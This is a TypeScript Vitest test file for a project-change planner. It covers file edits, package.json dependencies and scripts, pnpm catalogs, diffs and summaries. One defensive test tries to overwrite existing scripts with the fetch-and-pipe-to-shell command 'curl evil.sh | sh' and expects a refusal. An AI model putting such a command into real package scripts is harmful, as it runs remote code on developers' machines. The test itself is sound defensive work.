import { describe, expect, it } from 'vitest';
import { PlanBuilder, renderDiff, summarize, type ReadFile } from './plan';
import { rejection } from './testing';

const reader =
  (files: Record<string, string>): ReadFile =>
  (file) =>
    Promise.resolve(files[file]);

const pkg = (extra: object = {}) => `${JSON.stringify({ name: 'shell', ...extra }, null, 2)}\n`;

describe('PlanBuilder files', () => {
  it('turns create, patch and delete into changes, sorted by path', async () => {
    const b = new PlanBuilder(reader({ 'edit.txt': 'one\n', 'gone.txt': 'bye\n' }));
    await b.delete('gone.txt');
    await b.patch('edit.txt', (s) => `${s}two\n`);
    await b.create('new.txt', 'hello\n');
    const plan = b.build();
    expect(plan.changes.map((c) => [c.path, c.action, c.track])).toEqual([
      ['edit.txt', 'patch', false],
      ['gone.txt', 'delete', false],
      ['new.txt', 'create', true],
    ]);
    expect(plan.changes[0]).toMatchObject({ before: 'one\n', after: 'one\ntwo\n' });
    expect(plan.changes[1]).toMatchObject({ before: 'bye\n', after: null });
    expect(plan.changes[2]).toMatchObject({ before: null, after: 'hello\n' });
  });

  it('is JSON-serializable', async () => {
    const b = new PlanBuilder(reader({}));
    await b.create('a.txt', 'a');
    const plan = b.build();
    expect(JSON.parse(JSON.stringify(plan))).toEqual(plan);
  });

  it('leaves out edits that change nothing', async () => {
    const b = new PlanBuilder(reader({ 'a.txt': 'same' }));
    await b.patch('a.txt', (s) => s);
    await b.create('a.txt', 'same');
    await b.create('t.txt', 'x');
    await b.delete('t.txt');
    expect(b.build().changes).toEqual([]);
  });

  it('keeps patches to a file created in the same plan in one create', async () => {
    const b = new PlanBuilder(reader({}));
    await b.create('a.ts', 'a');
    await b.patch('a.ts', (s) => `${s}b`);
    expect(b.build().changes).toEqual([
      {
        path: 'a.ts',
        action: 'create',
        before: null,
        after: 'ab',
        track: true,
        trust: 'first-party',
      },
    ]);
  });

  it('refuses to create over a different existing file (E207) and to patch a missing one (E208)', async () => {
    const b = new PlanBuilder(reader({ 'a.txt': 'mine' }));
    await expect(b.create('a.txt', 'theirs')).rejects.toMatchObject({ code: 'MFEFLOW_E207' });
    await expect(b.patch('nope.txt', (s) => s)).rejects.toMatchObject({ code: 'MFEFLOW_E208' });
  });

  it('can create an untracked file', async () => {
    const b = new PlanBuilder(reader({}));
    await b.create('a.txt', 'a', false);
    expect(b.build().changes[0]?.track).toBe(false);
  });
});

describe('PlanBuilder mfeflow.json', () => {
  it('records the mfeflow.json it planned against, or null when there is none', async () => {
    const present = new PlanBuilder(reader({ 'mfeflow.json': '{"version":1}\n' }));
    expect(present.build().projectBefore).toBeUndefined();
    await present.captureProject();
    expect(present.build().projectBefore).toBe('{"version":1}\n');
    const absent = new PlanBuilder(reader({}));
    await absent.captureProject();
    expect(absent.build().projectBefore).toBeNull();
    expect(absent.build().changes).toEqual([]);
  });
});

describe('PlanBuilder package.json', () => {
  it('adds dependencies sorted, keeping indentation and the final newline', async () => {
    const source = `{\n    "name": "shell",\n    "dependencies": {\n        "zod": "^4.0.0"\n    }\n}\n`;
    const b = new PlanBuilder(reader({ 'package.json': source }));
    await b.addDependency('package.json', 'react', '^19.0.0');
    await b.addDependency('package.json', 'vitest', '^5.0.0', true);
    const after = b.build().changes[0]?.after ?? '';
    expect(after).toBe(
      `{\n    "name": "shell",\n    "dependencies": {\n        "react": "^19.0.0",\n        "zod": "^4.0.0"\n    },\n    "devDependencies": {\n        "vitest": "^5.0.0"\n    }\n}\n`,
    );
    expect(b.build().dependencies).toEqual([
      { file: 'package.json', name: 'react', range: '^19.0.0', dev: false },
      { file: 'package.json', name: 'vitest', range: '^5.0.0', dev: true },
    ]);
  });

  it('never changes the range of a dependency that is already there (E207)', async () => {
    const source = pkg({
      dependencies: { react: '^18.0.0' },
      devDependencies: { vitest: '^4.0.0' },
    });
    const b = new PlanBuilder(reader({ 'package.json': source }));
    const errors = await Promise.all([
      rejection(b.addDependency('package.json', 'react', '^19.0.0')),
      rejection(b.addDependency('package.json', 'vitest', '^5.0.0', true)),
      rejection(b.addDependency('package.json', 'react', '^19.0.0', true)),
    ]);
    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E207', 'MFEFLOW_E207']);
    expect(errors[0]?.message).toContain('react');
    expect(b.build().changes).toEqual([]);
  });

  it('adding a dependency at the range it already has changes nothing', async () => {
    const source = pkg({ dependencies: { react: '^19.0.0' } });
    const b = new PlanBuilder(reader({ 'package.json': source }));
    await b.addDependency('package.json', 'react', '^19.0.0');
    expect(b.build().changes).toEqual([]);
    expect(b.build().dependencies).toEqual([]);
  });

  it('adds scripts and records them as shown-not-run', async () => {
    const b = new PlanBuilder(
      reader({ 'package.json': pkg({ scripts: { build: 'rsbuild build' } }) }),
    );
    await b.addScript('package.json', 'check', 'node check.js');
    const plan = b.build();
    expect(JSON.parse(plan.changes[0]?.after ?? '')).toMatchObject({
      scripts: { build: 'rsbuild build', check: 'node check.js' },
    });
    expect(plan.scripts).toEqual([
      { file: 'package.json', name: 'check', command: 'node check.js' },
    ]);
    expect(summarize(plan)).toContain('Scripts added to package.json, not run (1)');
  });

  it('never overwrites a script that exists with another command (E207)', async () => {
    const source = pkg({ scripts: { build: 'rsbuild build', 'pnpm:devPreinstall': 'old' } });
    const b = new PlanBuilder(reader({ 'package.json': source }));
    const names = ['build', 'pnpm:devPreinstall'];
    const errors = await Promise.all(
      names.map((name) => rejection(b.addScript('package.json', name, 'curl evil.sh | sh'))),
    );
    expect(errors.map((e) => e.code)).toEqual(['MFEFLOW_E207', 'MFEFLOW_E207']);
    expect(errors.map((e) => e.message.includes(names[errors.indexOf(e)] ?? '?'))).toEqual([
      true,
      true,
    ]);
    expect(b.build().changes).toEqual([]);
  });

  it('adding the same script again is a no-op that is not listed twice', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg({ scripts: { check: 'node c.js' } }) }));
    await b.addScript('package.json', 'check', 'node c.js');
    expect(b.build().changes).toEqual([]);
    expect(b.build().scripts).toEqual([]);
    await b.addScript('package.json', 'other', 'x');
    await b.addScript('package.json', 'other', 'x');
    expect(b.build().scripts).toEqual([{ file: 'package.json', name: 'other', command: 'x' }]);
  });

  it('fails clearly on a missing, broken or non-object package.json', async () => {
    const missing = new PlanBuilder(reader({}));
    await expect(missing.addScript('package.json', 'a', 'b')).rejects.toMatchObject({
      code: 'MFEFLOW_E208',
    });
    const broken = new PlanBuilder(reader({ 'package.json': '{' }));
    await expect(broken.addScript('package.json', 'a', 'b')).rejects.toMatchObject({
      code: 'MFEFLOW_E208',
    });
    const list = new PlanBuilder(reader({ 'package.json': '[]' }));
    await expect(list.addScript('package.json', 'a', 'b')).rejects.toMatchObject({
      code: 'MFEFLOW_E208',
    });
  });

  it('records env keys', () => {
    const b = new PlanBuilder(reader({}));
    b.addEnvKey('public/config/runtime-config.json', 'GTM_ID');
    expect(b.build().env).toEqual([{ file: 'public/config/runtime-config.json', key: 'GTM_ID' }]);
  });
});

const rewriteRange = (name: string, range: string) =>
  name.startsWith('@mfeflow/') && range === 'latest' ? 'link:/repo/packages/x' : undefined;

describe('PlanBuilder rewriteRange', () => {
  const workspace = 'catalog:\n  react: 19.3.1\n';
  it('writes the rewritten range as is, outside the catalog', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg(), 'pnpm-workspace.yaml': workspace }), {
      catalog: true,
      rewriteRange,
    });
    await b.addDependency('package.json', '@mfeflow/rsbuild', 'latest');
    await b.addDependency('package.json', 'react', '19.3.1');
    const plan = b.build();
    expect(plan.dependencies.map((d) => [d.name, d.range])).toEqual([
      ['@mfeflow/rsbuild', 'link:/repo/packages/x'],
      ['react', 'catalog:'],
    ]);
    expect(plan.changes.map((c) => c.path)).toEqual(['package.json']);
  });

  it('keeps the declared range when the hook returns undefined', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg() }), { rewriteRange });
    await b.addDependency('package.json', 'zod', '^4.0.0');
    expect(b.build().dependencies[0]?.range).toBe('^4.0.0');
  });
});

describe('PlanBuilder catalog', () => {
  const workspace = '# versions\ncatalog:\n  react: 19.3.1 # keep\n';

  it('uses catalog: for a dependency already in the catalog', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg(), 'pnpm-workspace.yaml': workspace }), {
      catalog: true,
    });
    await b.addDependency('package.json', 'react', '^19.0.0');
    const plan = b.build();
    expect(plan.dependencies[0]?.range).toBe('catalog:');
    expect(plan.changes.map((c) => c.path)).toEqual(['package.json']);
    expect(plan.warnings).toEqual([
      'react is 19.3.1 in the catalog; using that instead of ^19.0.0',
    ]);
  });

  it('adds a new dependency to the catalog, keeping comments', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg(), 'pnpm-workspace.yaml': workspace }), {
      catalog: true,
    });
    await b.addDependency('package.json', 'zod', '4.1.0');
    const plan = b.build();
    const yamlAfter = plan.changes.find((c) => c.path === 'pnpm-workspace.yaml')?.after ?? '';
    expect(yamlAfter).toContain('# versions');
    expect(yamlAfter).toContain('react: 19.3.1 # keep');
    expect(yamlAfter).toContain('zod: 4.1.0');
    expect(plan.dependencies[0]?.range).toBe('catalog:');
  });

  it('keeps plain ranges without a workspace file, with catalog off, or for workspace: and catalog: ranges', async () => {
    const files = { 'package.json': pkg(), 'pnpm-workspace.yaml': workspace };
    const noWorkspace = new PlanBuilder(reader({ 'package.json': pkg() }), { catalog: true });
    await noWorkspace.addDependency('package.json', 'zod', '^4.0.0');
    expect(noWorkspace.build().dependencies[0]?.range).toBe('^4.0.0');
    const off = new PlanBuilder(reader(files));
    await off.addDependency('package.json', 'zod', '^4.0.0');
    expect(off.build().dependencies[0]?.range).toBe('^4.0.0');
    const pinned = new PlanBuilder(reader(files), { catalog: true });
    await pinned.addDependency('package.json', '@x/a', 'workspace:*');
    await pinned.addDependency('package.json', 'react', 'catalog:');
    expect(pinned.build().dependencies.map((d) => d.range)).toEqual(['workspace:*', 'catalog:']);
  });

  it('starts a catalog when the workspace file has none', async () => {
    const b = new PlanBuilder(
      reader({ 'package.json': pkg(), 'pnpm-workspace.yaml': 'packages:\n  - apps/*\n' }),
      {
        catalog: true,
      },
    );
    await b.addDependency('package.json', 'zod', '4.1.0');
    const yamlAfter = b.build().changes.find((c) => c.path === 'pnpm-workspace.yaml')?.after ?? '';
    expect(yamlAfter).toBe('packages:\n  - apps/*\ncatalog:\n  zod: 4.1.0\n');
  });
});

describe('PlanBuilder replace', () => {
  it('overwrites an existing file and shows it as a patch', async () => {
    const b = new PlanBuilder(reader({ 'src/a.ts': 'old\n' }));
    await b.replace('src/a.ts', 'new\n');
    const plan = b.build();
    expect(plan.changes).toMatchObject([
      { path: 'src/a.ts', action: 'patch', before: 'old\n', after: 'new\n', track: false },
    ]);
    expect(renderDiff(plan)).toContain('-old');
    expect(renderDiff(plan)).toContain('+new');
  });

  it('records nothing when the content is the same', async () => {
    const b = new PlanBuilder(reader({ 'a.txt': 'same\n' }));
    await b.replace('a.txt', 'same\n');
    expect(b.build().changes).toEqual([]);
  });

  it('refuses a file that does not exist', async () => {
    const b = new PlanBuilder(reader({}));
    expect(await rejection(b.replace('a.txt', 'x'))).toMatchObject({ code: 'MFEFLOW_E208' });
  });

  it('refuses a third-party change but allows the same content', async () => {
    const b = new PlanBuilder(reader({ 'a.txt': 'one\n' })).scoped('third-party');
    await b.replace('a.txt', 'one\n');
    expect(await rejection(b.replace('a.txt', 'two\n'))).toMatchObject({ code: 'MFEFLOW_E207' });
  });
});

describe('PlanBuilder setRange', () => {
  const deps = (range: string) => pkg({ dependencies: { react: range, zod: '^4.0.0' } });

  it('updates a plain range in place, keeping the order', async () => {
    const b = new PlanBuilder(reader({ 'package.json': deps('^18.0.0') }));
    await b.setRange('package.json', 'react', '^19.0.0');
    const plan = b.build();
    expect(plan.changes[0]?.after).toBe(deps('^19.0.0'));
  });

  it('moves every section that lists the name, and skips a section already at the target', async () => {
    const both = (prod: string, dev: string) =>
      pkg({ dependencies: { react: prod }, devDependencies: { react: dev } });
    const first = new PlanBuilder(reader({ 'package.json': both('^18.0.0', '^18.0.0') }));
    await first.setRange('package.json', 'react', '^19.0.0');
    expect(first.build().changes[0]?.after).toBe(both('^19.0.0', '^19.0.0'));
    const second = new PlanBuilder(reader({ 'package.json': both('^19.0.0', '^18.0.0') }));
    await second.setRange('package.json', 'react', '^19.0.0');
    expect(second.build().changes[0]?.after).toBe(both('^19.0.0', '^19.0.0'));
  });

  it('finds a dev dependency', async () => {
    const b = new PlanBuilder(
      reader({ 'package.json': pkg({ devDependencies: { vitest: '^4.0.0' } }) }),
    );
    await b.setRange('package.json', 'vitest', '^5.0.0');
    expect(b.build().changes[0]?.after).toContain('"vitest": "^5.0.0"');
  });

  it('changes the catalog entry, not package.json, for a catalog: dependency', async () => {
    const workspace = '# versions\ncatalog:\n  react: 18.0.0 # keep\n';
    const b = new PlanBuilder(
      reader({ 'package.json': deps('catalog:'), 'pnpm-workspace.yaml': workspace }),
    );
    await b.setRange('package.json', 'react', '19.3.1');
    const plan = b.build();
    expect(plan.changes.map((c) => c.path)).toEqual(['pnpm-workspace.yaml']);
    expect(plan.changes[0]?.after).toBe('# versions\ncatalog:\n  react: 19.3.1 # keep\n');
  });

  it('changes a named catalog', async () => {
    const workspace = 'catalogs:\n  next:\n    react: 18.0.0\n';
    const b = new PlanBuilder(
      reader({ 'package.json': deps('catalog:next'), 'pnpm-workspace.yaml': workspace }),
    );
    await b.setRange('package.json', 'react', '19.3.1');
    expect(b.build().changes[0]?.after).toBe('catalogs:\n  next:\n    react: 19.3.1\n');
  });

  it('does nothing when the range is already there or the dependency is a workspace link', async () => {
    const same = new PlanBuilder(reader({ 'package.json': deps('^19.0.0') }));
    await same.setRange('package.json', 'react', '^19.0.0');
    const linked = new PlanBuilder(reader({ 'package.json': deps('workspace:*') }));
    await linked.setRange('package.json', 'react', '^19.0.0');
    expect(same.build().changes).toEqual([]);
    expect(linked.build().changes).toEqual([]);
  });

  it('is an E208 for a missing file, dependency or catalog entry', async () => {
    const b = new PlanBuilder(
      reader({
        'package.json': deps('catalog:'),
        'pnpm-workspace.yaml': 'catalog:\n  zod: 4.0.0\n',
      }),
    );
    expect(await rejection(b.setRange('other.json', 'react', '1.0.0'))).toMatchObject({
      code: 'MFEFLOW_E208',
    });
    expect(await rejection(b.setRange('package.json', 'left-pad', '1.0.0'))).toMatchObject({
      code: 'MFEFLOW_E208',
    });
    expect(await rejection(b.setRange('package.json', 'react', '1.0.0'))).toMatchObject({
      code: 'MFEFLOW_E208',
    });
    const noWorkspace = new PlanBuilder(reader({ 'package.json': deps('catalog:') }));
    expect(await rejection(noWorkspace.setRange('package.json', 'react', '1.0.0'))).toMatchObject({
      code: 'MFEFLOW_E208',
    });
  });

  it('leaves npm:, link:, file:, repository and URL specifiers alone, with a warning', async () => {
    for (const specifier of [
      'npm:other@^1.0.0',
      'link:../react',
      'file:./react.tgz',
      'github:facebook/react',
      'git+https://example.com/react.git',
      'https://example.com/react.tgz',
    ]) {
      const b = new PlanBuilder(reader({ 'package.json': deps(specifier) }));
      await b.setRange('package.json', 'react', '^19.0.0');
      const plan = b.build();
      expect(plan.changes, specifier).toEqual([]);
      expect(plan.warnings[0], specifier).toContain(specifier);
    }
  });

  it('accepts a semver range or a dist-tag, and refuses anything else (E202)', async () => {
    for (const ok of ['^19.0.0', '>=18 <20', '19.x', 'next']) {
      const b = new PlanBuilder(reader({ 'package.json': deps('^18.0.0') }));
      await b.setRange('package.json', 'react', ok);
      expect(b.build().changes[0]?.after, ok).toContain(`"react": "${ok}"`);
    }
    for (const bad of ['', 'not a range!', 'link:../x', 'catalog:', 'workspace:*', 'a/b']) {
      const b = new PlanBuilder(reader({ 'package.json': deps('^18.0.0') }));
      expect(await rejection(b.setRange('package.json', 'react', bad)), bad).toMatchObject({
        code: 'MFEFLOW_E202',
      });
    }
  });

  it('says so when pnpm-workspace.yaml is not valid YAML', async () => {
    const b = new PlanBuilder(
      reader({
        'package.json': deps('catalog:'),
        'pnpm-workspace.yaml': 'catalog:\n  react: [1\n',
      }),
    );
    const error = await rejection(b.setRange('package.json', 'react', '19.3.1'));
    expect(error).toMatchObject({ code: 'MFEFLOW_E208' });
    expect((error as Error).message).toContain('not valid YAML');
  });

  it('lets a third-party feature ask only for the range already there', async () => {
    const b = new PlanBuilder(reader({ 'package.json': deps('^18.0.0') })).scoped('third-party');
    await b.setRange('package.json', 'react', '^18.0.0');
    expect(await rejection(b.setRange('package.json', 'react', '^19.0.0'))).toMatchObject({
      code: 'MFEFLOW_E207',
    });
  });

  it('keeps addDependency refusing to change an existing range', async () => {
    const b = new PlanBuilder(reader({ 'package.json': deps('^18.0.0') }));
    expect(await rejection(b.addDependency('package.json', 'react', '^19.0.0'))).toMatchObject({
      code: 'MFEFLOW_E207',
    });
  });
});

describe('renderDiff', () => {
  it('shows creates, patches and deletes as unified diffs', async () => {
    const b = new PlanBuilder(reader({ 'a.txt': 'one\ntwo\nthree\n', 'gone.txt': 'bye\n' }));
    await b.patch('a.txt', (s) => s.replace('two', '2'));
    await b.delete('gone.txt');
    await b.create('new.txt', 'hello\n');
    const diff = renderDiff(b.build());
    expect(diff).toContain('--- a/a.txt\n+++ b/a.txt');
    expect(diff).toContain('-two\n+2');
    expect(diff).toContain('--- a/gone.txt\n+++ /dev/null');
    expect(diff).toContain('-bye');
    expect(diff).toContain('--- /dev/null\n+++ b/new.txt');
    expect(diff).toContain('+hello');
  });

  it('is empty for an empty plan', () => {
    expect(renderDiff(new PlanBuilder(reader({})).build())).toBe('');
  });
});

describe('summarize', () => {
  it('counts changes and lists dependencies, env keys and warnings', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg() }));
    await b.create('src/a.ts', 'a');
    await b.addDependency('package.json', 'zod', '^4.0.0', true);
    b.addEnvKey('runtime.json', 'KEY');
    b.warn('careful');
    const text = summarize(b.build());
    expect(text).toContain('1 to create, 1 to patch, 0 to delete');
    expect(text).toContain('create  src/a.ts');
    expect(text).toContain('patch   package.json');
    expect(text).toContain('package.json  zod@^4.0.0 (dev)');
    expect(text).toContain('runtime.json  KEY');
    expect(text).toContain('Warning: careful');
  });

  it('is one line for an empty plan', () => {
    expect(summarize(new PlanBuilder(reader({})).build())).toBe(
      '0 to create, 0 to patch, 0 to delete',
    );
  });
});

describe('summarize new packages', () => {
  it('lists what a third-party feature adds in its own block, apart from other dependencies', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg() }));
    await b.addDependency('package.json', 'zod', '^4.0.0');
    await b.scoped('third-party').addDependency('package.json', 'left-pad', '^1.3.0');
    const plan = b.build();
    expect(plan.dependencies.map((d) => [d.name, d.thirdParty])).toEqual([
      ['zod', undefined],
      ['left-pad', true],
    ]);
    const text = summarize(plan);
    expect(text).toContain('Dependencies (1):');
    expect(text).toContain('NEW PACKAGES from a third-party feature (1):');
    expect(text.indexOf('NEW PACKAGES')).toBeLessThan(text.indexOf('left-pad@^1.3.0'));
    expect(text.indexOf('zod@^4.0.0')).toBeLessThan(text.indexOf('NEW PACKAGES'));
    expect(text).toContain('pnpm 10 and later blocks them');
  });

  it('does not list a package the project already has', async () => {
    const b = new PlanBuilder(reader({ 'package.json': pkg({ dependencies: { zod: '^4.0.0' } }) }));
    await b.scoped('third-party').addDependency('package.json', 'zod', '^4.0.0');
    expect(summarize(b.build())).not.toContain('NEW PACKAGES');
  });
});
